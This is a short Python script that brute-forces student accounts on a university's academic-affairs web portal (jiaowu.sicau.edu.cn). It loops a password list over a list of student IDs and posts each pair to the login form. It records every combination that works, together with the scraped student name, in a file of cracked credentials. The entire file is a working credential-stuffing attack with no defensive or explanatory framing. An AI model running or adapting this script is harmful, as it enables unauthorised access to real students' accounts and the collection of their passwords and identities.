import requests
import re
from lxml import etree
import datetime as d


def log_scau(id, pwd, num):
    session = requests.Session()
    t = d.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_pwd = open('/home/duansq/user_pwd.txt', 'a+')
    log = open('/home/duansq/crak_pwd.log', 'a+')
    time_out = open('/home/duansq/time_out.txt', 'a+')
    try:
        index = session.get('http://jiaowu.sicau.edu.cn/web/web/web/index.asp', timeout=5)
        index.encoding = 'gb2312'
        seletor = etree.HTML(index.text)
        sign = seletor.xpath("//input[@name='sign']/@value")
        data = {'user': id, 'pwd': pwd, 'lb': 'S', 'submit': '', 'sign': sign}
        try:
            post_url = 'http://jiaowu.sicau.edu.cn/jiaoshi/bangong/check.asp'
            try:
                session.post(post_url, data=data, timeout=5)
                data = session.get('http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp', timeout=5)  # 跳转到个人主页
            except:
                print(num, id, 'Connection_timed_out_2', t, file=log)
                print(id, file=time_out)
                print(num, id, 'Connection_timed_out_2')
            data.encoding = 'gb2312'
            name = re.compile('<td width="99" align="left">(.*)</td>').findall(data.text)  # 正则匹配你的名字
            print(id, pwd, name[1], file=user_pwd)
            print(num, id, pwd, name[1], t, file=log)
            print(num, id, pwd, name[1], t)
        except:
            print(num, id, 'wrong_password', t, file=log)
            print(num, id, pwd, 'wrong_password', t)
    except:
        print(num, id, 'Connection_timed_out_1', t, file=log)
        print(num, id, 'Connection_timed_out_1', t)
        print(id, file=time_out)

with open('/home/duansq/user_id', 'r') as r:
    user_set = r.readlines()
with open('/home/duansq/duan/2017/pwd', 'r') as r:
    pwd_set = r.readlines()

for pwd in pwd_set:
    a = 0
    for i in user_set:
        a += 1
        user = i[0:-1]
        log_scau(user, pwd[:-1], a)
